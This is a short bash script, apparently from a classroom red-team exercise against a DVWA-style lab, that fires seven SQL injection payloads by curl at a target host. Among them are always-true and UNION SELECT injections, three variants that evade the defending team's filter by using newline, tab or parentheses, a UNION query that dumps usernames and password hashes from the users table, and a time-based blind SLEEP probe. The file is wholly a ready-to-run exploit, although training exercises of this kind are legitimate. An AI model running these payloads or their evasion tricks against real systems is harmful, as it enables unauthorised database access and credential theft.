#!/bin/bash
TARGET="${1:-localhost}"
PORT="8080"
COOKIE="PHPSESSID=cqcllo8bdvm046l3fvl96cqe7i; security=low"

echo "=== Equipe 2 - Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

echo "[1] OR always-true (detectable)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[2] UNION SELECT classique (detectable)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[3] EVASION newline %0a (bypasse leur regle)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%0aSELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[4] EVASION tab %09 (bypasse leur regle)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%09SELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[5] EVASION parentheses (bypasse leur regle)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION(SELECT+1,database())--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[6] EVASION dump passwords via newline"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%0aSELECT+user,password+FROM+users--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo "[7] Time-based blind (discret)"
curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+SLEEP(3)--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"

echo ""
echo "=== Fin des attaques ==="
